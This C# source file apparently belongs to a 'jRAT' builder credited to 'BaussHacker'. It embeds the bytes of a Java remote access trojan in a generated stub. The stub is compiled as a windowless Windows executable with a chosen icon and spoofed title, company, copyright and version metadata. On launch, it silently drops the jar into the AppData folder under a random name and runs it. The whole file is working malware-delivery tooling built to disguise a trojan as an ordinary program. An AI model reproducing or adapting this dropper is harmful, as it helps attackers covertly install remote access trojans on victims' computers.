// C# Project by BaussHacker
using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.CodeDom;
using System.IO;

namespace jRAT
{
	/// <summary>
	/// Description of CompileCode.
	/// </summary>
	public class CompileCode
	{
		private static byte[] jarcode;
		public static void GetJarCode(string file)
		{
			jarcode = System.IO.File.ReadAllBytes(file);
		}
		
		private static string pArgs;
		public static void AddArguments(string args)
		{
			pArgs = args;
		}

        private static string compileCode = @"using System;
        using System.Diagnostics;
        using System.IO;
        
        namespace _namespace
        {
            class _class
            {
                    static byte[] jarbytes = new byte[] {
                    __JARBYTES__
                    };
                    static void Main(string[] args)
                    {
                        String s = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) + ""\\"" + new Random().Next() + "".jar"";
                        if (!File.Exists(s))
                        {
                            System.IO.File.WriteAllBytes(s, jarbytes);
                        }
                        String quote = ""\"""";
                        
                        Process.Start(s);
                    }
            }
        }";
		
		public static string GetCompilerCode(string outputfile)
		{
			StringBuilder bytebuilder = new StringBuilder();
			foreach (byte b in jarcode)
				bytebuilder.Append(b).Append(", ");
			bytebuilder.Length -= 2;
			return compileCode.Replace("__JARFILE__", outputfile.Replace("\\", "\\\\"))
				.Replace("__JARBYTES__", bytebuilder.ToString())
				.Replace("__PARGS__", pArgs);
		}
		
		public static void Compile(string filename, string outputfile, string iconfile, string title, string description, string company, string product, string copyright, string trademark, string version, string assemblyversion )
		{

			string code = GetCompilerCode(outputfile);

			Dictionary<string, string> providerOptions = new Dictionary<string, string>()
			{
				{"CompilerVersion", "v2.0"}
			};
			CompilerParameters compilerParams = new CompilerParameters()
			{
				GenerateInMemory = false,
				GenerateExecutable = true
			};   
 
            compilerParams.OutputAssembly = filename;

            if (!iconfile.Equals("NULL"))
            {
                compilerParams.CompilerOptions = string.Format("/target:winexe \"/win32icon:{0}\"", iconfile);
                compilerParams.CompilerOptions += " /optimize /target:winexe";
            }
            else
            {            
                compilerParams.CompilerOptions = "/optimize /target:winexe";
            }

			foreach (var assembly in AppDomain.CurrentDomain.GetAssemblies())
			{
				compilerParams.ReferencedAssemblies.Add(assembly.Location);
			}

			CSharpCodeProvider provider = new CSharpCodeProvider();       

            string info = @"using System.Reflection;

             [assembly: AssemblyTitle(""<1>"")]
             [assembly: AssemblyDescription(""<2>"")]
             [assembly: AssemblyCompany(""<3>"")]
             [assembly: AssemblyProduct(""<4>"")]
             [assembly: AssemblyCopyright(""<5>"")]
             [assembly: AssemblyTrademark(""<6>"")]
             [assembly: AssemblyVersion(""<7>"")]
             [assembly: AssemblyFileVersion(""<8>"")]";
			
			CompilerResults results = provider.CompileAssemblyFromSource(compilerParams, code, info.Replace("<1>", title).Replace("<2>", description).Replace("<3>", company).Replace("<4>", product).Replace("<5>", copyright).Replace("<6>", trademark).Replace("<7>", version).Replace("<8>", assemblyversion));

			if (results == null)
				throw new Exception("Unknown build error.");

			if (results.Errors.Count != 0)
			{
				foreach (CompilerError err in results.Errors)
					System.Windows.Forms.MessageBox.Show(err.ToString());
			}
		}
	}
}
